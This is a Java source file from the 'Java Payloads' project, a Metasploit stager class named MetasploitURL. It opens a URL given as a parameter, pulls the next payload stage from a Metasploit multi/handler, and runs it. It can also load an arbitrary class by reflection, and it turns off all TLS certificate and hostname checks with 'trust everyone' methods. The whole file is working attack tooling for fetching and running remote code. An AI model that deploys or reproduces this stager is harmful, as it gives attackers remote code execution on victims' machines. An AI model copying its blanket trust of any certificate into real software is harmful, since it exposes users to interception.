/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stager;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

// only useful when used with a Metasploit multi/handler
public class MetasploitURL extends Stager implements X509TrustManager, HostnameVerifier {

	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
		String url = parameters[1];
		InputStream in;
		if (url.startsWith("raw:")) {
			// for debugging: just use raw bytes from property file
			in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
		} else if (url.startsWith("call:")) {
			in = (InputStream) Class.forName(url.substring(5)).getMethod("getIn", (Class[]) null).invoke(null, (Object[]) null);
		} else if (url.startsWith("https:")) {
			URLConnection uc = new URL(url).openConnection();
			if (uc instanceof HttpsURLConnection) {
				HttpsURLConnection huc = ((HttpsURLConnection) uc);
				SSLContext sc = SSLContext.getInstance("SSL");
				sc.init(null, new TrustManager[] { this }, new java.security.SecureRandom());
				huc.setSSLSocketFactory(sc.getSocketFactory());
				huc.setHostnameVerifier(this);
			}
			in = uc.getInputStream();
		} else {
			in = new URL(url).openStream();
		}
		bootstrap(in, new ByteArrayOutputStream(), parameters);
	}

	public void waitReady() throws InterruptedException {
	}

	public X509Certificate[] getAcceptedIssuers() {
		// no preferred issuers
		return new X509Certificate[0];
	}

	public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
		// trust everyone
	}

	public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
		// trust everyone
	}

	public boolean verify(String hostname, SSLSession session) {
		// trust everyone
		return true;
	}
}
